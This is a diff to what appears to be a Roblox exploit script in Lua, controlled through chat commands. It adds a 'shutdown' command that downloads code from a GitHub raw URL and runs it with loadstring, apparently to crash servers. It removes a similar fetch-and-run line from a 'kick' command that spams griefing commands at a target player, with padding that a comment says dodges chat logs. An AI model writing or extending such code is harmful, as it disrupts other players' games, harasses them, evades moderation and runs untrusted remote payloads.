@@ -190,6 +190,7 @@ Tutup.TextColor3 = Color3.new(0, 1, 0)
 Tutup.TextSize = 25
 Tutup.MouseButton1Down:connect(function()
 	antipunish = false
+	PadCheck = false
 	for _, connection in ipairs(cons) do
 		connection:Disconnect()
 	end
@@ -449,6 +450,13 @@ cons[#cons + 1] = game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if string.sub(msg, 0, 3 + #prefix) == prefix.."lua" then
 		local code = string.sub(msg, 5 + #prefix)
         loadstring(code)()
+	elseif string.sub(msg, 0, 8 + #prefix) == prefix.."shutdown" then
+		loadstring(game:HttpGet(("https://raw.githubusercontent.com/Tech-187/Lua-scripts/main/scv3-var's%20usilcrash"),true))()
+		if debounce1 then return end
+		getgenv().debounce1 = true
+            task.delay(1.5, function()
+                getgenv().debounce1 = false
+            end)
 	elseif string.sub(msg, 0, 4 + #prefix) == prefix.."kick" then
 		if debounce1 then return end
             getgenv().debounce1 = true
@@ -456,10 +464,6 @@ cons[#cons + 1] = game.Players.LocalPlayer.Chatted:Connect(function(msg)
                 getgenv().debounce1 = false
             end)
 		GetPlayer2(string.sub(msg, 6 + #prefix))
-		task.spawn(function() -- Faster than to just put it there, before u ask.
-			loadstring(game:HttpGet(('https://raw.githubusercontent.com/Tech-187/Temp/main/pm%20stuff'),true))()
-		end)
-		antimessage = true
 		spammer = true
 		chatt("respawn "..target)
 		chatt("blind "..target.."                                                                                                                                                                      fuck") -- fuck is added at the end so the command is tagged in peoples clogs. That prevents logging, as well as the double chat bug
